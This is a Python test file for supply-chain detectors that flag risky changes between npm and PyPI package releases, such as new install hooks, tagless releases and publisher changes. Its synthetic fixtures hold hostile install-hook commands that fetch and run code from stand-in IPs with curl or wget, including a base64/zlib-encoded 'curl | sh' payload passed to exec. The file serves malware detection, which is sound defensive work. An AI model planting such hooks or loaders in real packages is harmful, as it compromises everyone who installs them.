"""release_delta, tagless_release and publisher_change on synthetic release pairs (inert text, offline)."""
import base64
import zlib

from detectors import publisher_change, release_delta, run_detectors, tagless_release
from detectors.context import DetectorContext
from fragility import compute_fragility
from release_helpers import (BENIGN_SETUP, EVIL_SETUP, NATIVE_BUILD_SETUP, history, npm_release, pypi_release,
                             with_git)

T0, T1 = "2026-01-10T10:00:00Z", "2026-03-01T10:00:00Z"
NET_JS = "const https = require('https');\nhttps.get('https://198.51.100.7/p', () => {});\n"


def run(det, rc, **kw):
    return det.detect(DetectorContext.build(releases=rc, **kw))


def tiers(r):
    return [f["tier"] for f in r["findings"]]


# ------------------------------------------------------------------ release_delta

def test_new_install_hook_plus_network_is_high_risk():
    old = npm_release("1.0.0", T0)
    new = npm_release("1.0.1", T1, scripts={"preinstall": "node preinstall.js"}, files={"preinstall.js": NET_JS})
    r = run(release_delta, history([new, old]))
    assert r["status"] == "ran" and tiers(r) == ["high_risk"]
    f = r["findings"][0]
    assert "1.0.1 adds install-time execution" in f["rule"] and "absent from 1.0.0" in f["rule"]
    pair = next(e for e in f["evidence"] if e["type"] == "version_pair")
    assert pair["new"] == "1.0.1" and pair["old"] == "1.0.0" and pair["new_upload_time"] == T1


def test_hook_command_that_downloads_is_high_risk():
    old = npm_release("0.7.28", T0)
    new = npm_release("0.7.29", T1, scripts={"preinstall": "curl http://198.51.100.9/x -o x && ./x"})
    assert tiers(run(release_delta, history([new, old]))) == ["high_risk"]


def test_setup_py_exec_and_network_added_is_high_risk():
    old = pypi_release("1.0", T0, files={"setup.py": BENIGN_SETUP})
    new = pypi_release("1.1", T1, files={"setup.py": EVIL_SETUP})
    assert tiers(run(release_delta, history([new, old], "PyPI"))) == ["high_risk"]


def test_new_hook_with_decoded_payload_is_high_risk():
    payload = 'import os; os.system("curl http://198.51.100.42/sh | sh")'
    enc = base64.b64encode(zlib.compress(payload.encode())).decode()
    old = npm_release("2.0.0", T0)
    new = npm_release("2.0.1", T1, scripts={"postinstall": "python3 setup_hook.py"},
                      files={"lib/loader.py": f"import base64, zlib\nexec(zlib.decompress(base64.b64decode('{enc}')).decode())\n"})
    r = run(release_delta, history([new, old]))
    assert tiers(r) == ["high_risk"] and "decoded payload" in r["findings"][0]["rule"]


def test_single_new_capability_is_review():
    old = npm_release("1.0.0", T0)
    new = npm_release("1.1.0", T1, files={"lib/telemetry.js": NET_JS})
    r = run(release_delta, history([new, old]))
    assert tiers(r) == ["review"] and "network access" in r["findings"][0]["rule"]


def test_changed_hook_command_counts_as_new_install_capability():
    old = npm_release("1.0.0", T0, scripts={"postinstall": "node build.js"}, files={"build.js": "console.log(1)\n"})
    new = npm_release("1.0.1", T1, scripts={"postinstall": "node build.js && wget http://198.51.100.3/a"}, files={"build.js": "console.log(1)\n"})
    assert tiers(run(release_delta, history([new, old]))) == ["high_risk"]


def test_benign_native_build_hook_is_not_flagged():
    old = npm_release("3.0.0", T0)
    new = npm_release("3.1.0", T1, scripts={"install": "node-gyp rebuild"}, files={"binding.gyp": "{}"})
    r = run(release_delta, history([new, old]))
    assert r["status"] == "ran" and r["findings"] == []


def test_benign_native_build_setup_py_change_is_not_flagged():
    old = pypi_release("1.0", T0, files={"setup.py": BENIGN_SETUP})
    new = pypi_release("1.1", T1, files={"setup.py": NATIVE_BUILD_SETUP, "src/fast.c": "int f(void){return 1;}\n"})
    assert run(release_delta, history([new, old], "PyPI"))["findings"] == []


def test_benign_vendored_code_bump_is_not_flagged():
    vendored = "import requests\nimport subprocess\n"
    old = pypi_release("1.0", T0, files={"demo/_vendor/old_lib.py": "x = 1\n"})
    new = pypi_release("1.1", T1, files={"demo/_vendor/urllib3_copy.py": vendored, "demo/_vendor/old_lib.py": "x = 2\n"})
    assert run(release_delta, history([new, old], "PyPI"))["findings"] == []


def test_unchanged_capabilities_are_not_flagged():
    files = {"lib/client.js": NET_JS}
    old = npm_release("1.0.0", T0, files=files, scripts={"postinstall": "node lib/client.js"})
    new = npm_release("1.0.1", T1, files=files, scripts={"postinstall": "node lib/client.js"})
    assert run(release_delta, history([new, old]))["findings"] == []


def test_release_delta_statuses():
    one = history([npm_release("1.0.0", T0)])
    assert run(release_delta, one)["status"] == "not_applicable"
    sec_no_pkg = {"level": "No unpatched issues found", "findings": [], "package": None}
    assert release_delta.detect(DetectorContext.build(security=sec_no_pkg))["not_assessed_reason"] == "no published package"
    sec_pkg = {"level": "No unpatched issues found", "findings": [], "package": {"ecosystem": "npm", "name": "demo"}}
    r = release_delta.detect(DetectorContext.build(security=sec_pkg))
    assert r["status"] == "not_assessed" and r["not_assessed_reason"] == "release history not fetched"
    old, new = pypi_release("1.0", T0), pypi_release("1.1", T1)
    new.update(contents=None, artifact_status="too_large")
    r = run(release_delta, history([new, old], "PyPI"))
    assert r["status"] == "not_assessed" and "too_large" in r["not_assessed_reason"]
    err = history([]); err["history"].update(status="error", reason="npm lookup failed (timeout)")
    assert run(release_delta, err)["not_assessed_reason"] == "npm lookup failed (timeout)"


def test_npm_without_tarball_compares_registry_scripts_with_partial_coverage():
    old = npm_release("1.0.0", T0)
    new = npm_release("1.0.1", T1, scripts={"preinstall": "curl http://198.51.100.9/x | sh"})
    new.update(contents=None, artifact_status="download_failed (timeout)")
    r = run(release_delta, history([new, old]))
    assert r["coverage"] == "partial" and "only registry scripts compared" in r["coverage_detail"]
    assert tiers(r) == ["high_risk"]


# ------------------------------------------------------------------ tagless_release

def test_missing_tag_alone_is_review():
    rc = with_git(history([npm_release("1.2.0", T1), npm_release("1.1.0", T0)]),
                  default_tree={"index.js", "package.json"}, tags=["v1.1.0"])
    r = run(tagless_release, rc)
    assert tiers(r) == ["review"] and "No git tag matches release 1.2.0" in r["findings"][0]["rule"]


def test_matching_tag_and_same_files_gives_no_findings():
    rc = with_git(history([npm_release("1.2.0", T1)]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0",
                  tag_tree={"index.js"})
    assert run(tagless_release, rc)["findings"] == []


def test_phantom_file_with_network_is_high_risk():
    new = npm_release("1.2.0", T1, files={"lib/update-check.js": NET_JS})
    rc = with_git(history([new]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0", tag_tree={"index.js"})
    r = run(tagless_release, rc)
    assert tiers(r) == ["high_risk"] and "lib/update-check.js (network)" in r["findings"][0]["detail"]


def test_phantom_file_without_capability_is_review():
    new = npm_release("1.2.0", T1, files={"lib/helpers.js": "module.exports = 1;\n"})
    rc = with_git(history([new]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0")
    assert tiers(run(tagless_release, rc)) == ["review"]


def test_generated_and_build_output_files_are_not_phantom():
    new = npm_release("1.2.0", T1, files={"dist/bundle.js": NET_JS, "lib/index.js": "module.exports = 1;\n",
                                          "lib/index.d.ts": "export {};\n"})
    rc = with_git(history([new]), default_tree={"index.js", "src/lib/index.ts"}, tags=["v1.2.0"], matched="v1.2.0")
    assert run(tagless_release, rc)["findings"] == []


def test_pypi_src_layout_files_match_by_suffix():
    new = pypi_release("2.0", T1, files={"demo/core.py": "import requests\n"})
    rc = with_git(history([new], "PyPI"), default_tree={"src/demo/__init__.py", "src/demo/core.py"}, tags=["2.0"], matched="2.0")
    assert run(tagless_release, rc)["findings"] == []


def test_tagless_statuses():
    rc = history([npm_release("1.0.0", T0)])
    rc["git"] = {"status": "error", "reason": "GitHub repository lookup failed (HTTP 403)"}
    r = run(tagless_release, rc)
    assert r["status"] == "not_assessed" and "403" in r["not_assessed_reason"]
    rc2 = with_git(history([npm_release("1.0.0", T0)]), default_tree={"index.js"})
    rc2["git"].update(tags=None, tags_error="timeout")
    r2 = run(tagless_release, rc2)
    assert r2["coverage"] == "partial" and "tag list not available" in r2["coverage_detail"]


# ------------------------------------------------------------------ publisher_change

def test_new_npm_publisher_is_review_with_context():
    rels = [npm_release("1.0.1", "2027-06-01T00:00:00Z", publisher="mallory", scripts={"preinstall": "node p.js"},
                        files={"p.js": NET_JS}),
            npm_release("1.0.0", "2026-01-01T00:00:00Z", publisher="alice"),
            npm_release("0.9.0", "2025-12-01T00:00:00Z", publisher="alice")]
    r = run(publisher_change, history(rels))
    assert tiers(r) == ["review"]
    d = r["findings"][0]["detail"]
    assert "published by alice" in d and "days after the previous release" in d
    assert "release_delta also finds a high-risk change in this same release" in d


def test_release_burst_is_mentioned():
    rels = [npm_release("1.0.3", "2026-03-01T12:00:00Z", publisher="mallory"),
            npm_release("1.0.2", "2026-03-01T06:00:00Z", publisher="alice"),
            npm_release("1.0.1", "2026-02-28T20:00:00Z", publisher="alice")]
    assert "burst of 3 releases" in run(publisher_change, history(rels))["findings"][0]["detail"]


def test_same_publisher_gives_no_findings():
    rels = [npm_release("1.0.1", T1), npm_release("1.0.0", T0)]
    assert run(publisher_change, history(rels))["findings"] == []


def test_pypi_without_provenance_is_not_available_not_failed():
    rels = [pypi_release("1.1", T1), pypi_release("1.0", T0)]
    r = run(publisher_change, history(rels, "PyPI"))
    assert r["status"] == "not_applicable" and "publisher identity not available" in r["not_assessed_reason"]


def test_pypi_release_losing_provenance_is_review():
    rels = [pypi_release("1.1", T1), pypi_release("1.0", T0, publisher="GitHub:acme/demo/release.yml")]
    r = run(publisher_change, history(rels, "PyPI"))
    assert tiers(r) == ["review"] and "no Trusted Publisher provenance" in r["findings"][0]["rule"]


def test_pypi_publisher_identity_change_is_review():
    rels = [pypi_release("1.1", T1, publisher="GitHub:someone-else/demo/release.yml"),
            pypi_release("1.0", T0, publisher="GitHub:acme/demo/release.yml")]
    assert tiers(run(publisher_change, history(rels, "PyPI"))) == ["review"]


def test_fragile_project_escalates_publisher_change_to_high_risk():
    rels = [npm_release("1.0.1", T1, publisher="mallory"), npm_release("1.0.0", T0, publisher="alice")]
    fr = compute_fragility(10, {"bus_factor": 1, "silent_departure": True, "burnout_status": "x"}, {"days_since_last_commit": 900})
    out = run_detectors(DetectorContext.build(releases=history(rels), fragility=fr), registry=[publisher_change])
    assert out[0]["tier"] == "high_risk" and out[0]["fragility_amplified"]
    assert "fragility index" in out[0]["findings"][0]["amplification_reason"]


CMAKE_SETUP = (
    "import subprocess\n"
    "from setuptools import setup, Extension\n"
    "from setuptools.command.build_ext import build_ext\n"
    "class CMakeBuild(build_ext):\n"
    "    def run(self):\n"
    "        subprocess.check_call(['cmake', '--build', '.'])\n"
    "setup(name='demo', version='1.1', ext_modules=[Extension('demo._fast', [])], cmdclass={'build_ext': CMakeBuild})\n")
GIT_VERSION_SETUP = (
    "import subprocess\n"
    "from setuptools import setup\n"
    "v = subprocess.check_output(['git', 'describe', '--tags']).decode().strip()\n"
    "setup(name='demo', version=v)\n")


def test_native_build_that_runs_cmake_is_at_most_review_never_high_risk():
    """A legitimate native build that starts a process at install time but makes no network access: the new
    capability is surfaced for review, but it is never high_risk (no network, no decoded payload)."""
    old = pypi_release("1.0", T0, files={"setup.py": BENIGN_SETUP})
    new = pypi_release("1.1", T1, files={"setup.py": CMAKE_SETUP})
    r = run(release_delta, history([new, old], "PyPI"))
    assert "high_risk" not in tiers(r) and set(tiers(r)) <= {"review"}


def test_git_describe_version_lookup_in_setup_py_is_not_flagged():
    old = pypi_release("1.0", T0, files={"setup.py": BENIGN_SETUP})
    new = pypi_release("1.1", T1, files={"setup.py": GIT_VERSION_SETUP})
    assert run(release_delta, history([new, old], "PyPI"))["findings"] == []
